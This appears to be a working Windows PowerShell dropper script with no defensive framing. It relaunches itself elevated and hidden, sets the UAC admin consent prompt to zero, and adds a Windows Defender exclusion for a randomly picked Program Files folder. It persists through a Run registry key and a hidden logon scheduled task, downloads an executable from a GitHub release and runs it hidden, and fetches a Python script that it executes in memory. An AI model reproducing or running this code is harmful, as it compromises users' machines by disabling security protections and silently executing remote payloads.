# Check if running as admin, relaunch with elevated privileges if not
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try {
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { $($MyInvocation.MyCommand.Definition) }`"" -Verb RunAs -WindowStyle Hidden -Wait
        exit 0
    }
    catch {
        throw
    }
}

# Initialize variables
$installFolder = (Get-ChildItem -Path "C:\Program Files" -Directory -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName | Get-Random) ?? "C:\Program Files"
$exePath = Join-Path $installFolder "scripthelper.exe"
$exeUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
$maxRetries = 3
$baseDelay = 1000
$maxDelay = 10000

# Simplified retry function with exponential backoff
function Invoke-Retry {
    param (
        [ScriptBlock]$Action
    )
    $retryCount = 0
    while ($retryCount -lt $maxRetries) {
        try {
            & $Action
            return
        }
        catch {
            $retryCount++
            if ($retryCount -eq $maxRetries) { throw $_ }
            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
            Start-Sleep -Milliseconds $delay
        }
    }
}

# Create and hide install folder
if (-not (Test-Path $installFolder)) {
    New-Item -Path $installFolder -ItemType Directory -Force | Out-Null
    Set-ItemProperty -Path $installFolder -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
}

# Disable UAC prompt
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction SilentlyContinue

# Add Windows Defender exclusion for the install folder
Invoke-Retry {
    $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
    if ($exclusions -notcontains $installFolder) {
        Add-MpPreference -ExclusionPath $installFolder
    }
}

# Add EXE to startup registry
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$regName = "ScriptHelper"
$regValue = "`"$exePath`""
if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
    New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String
}

# Create scheduled task for EXE
$taskName = "ScriptHelperTask"
if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
    $action = New-ScheduledTaskAction -Execute $exePath
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $principal = New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Script Helper Task"
}

# Download and execute scripthelper.exe
$webClient = $null
try {
    Invoke-Retry {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($exeUrl, $exePath)
        if (Test-Path $exePath) {
            Start-Process -FilePath $exePath -WindowStyle Hidden -Wait
        }
        else {
            throw "File not found at $exePath"
        }
    }
}
catch {}
finally {
    if ($webClient) { $webClient.Dispose() }
}

# Execute Python script in memory
$pythonScriptUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/1.pyw"
try {
    $null = python --version 2>&1
    if ($LASTEXITCODE -eq 0) {
        Invoke-Retry {
            $webClient = New-Object System.Net.WebClient
            $pythonScriptContent = $webClient.DownloadString($pythonScriptUrl)
            if ($pythonScriptContent) {
                $processInfo = New-Object System.Diagnostics.ProcessStartInfo
                $processInfo.FileName = "python"
                $processInfo.Arguments = "-"
                $processInfo.RedirectStandardInput = $true
                $processInfo.UseShellExecute = $false
                $processInfo.CreateNoWindow = $true
                $process = [System.Diagnostics.Process]::Start($processInfo)
                $process.StandardInput.Write($pythonScriptContent)
                $process.StandardInput.Close()
                $process.WaitForExit(30000)
            }
        }
    }
}
catch {}
finally {
    if ($webClient) { $webClient.Dispose() }
    if ($process) { $process.Dispose() }
}
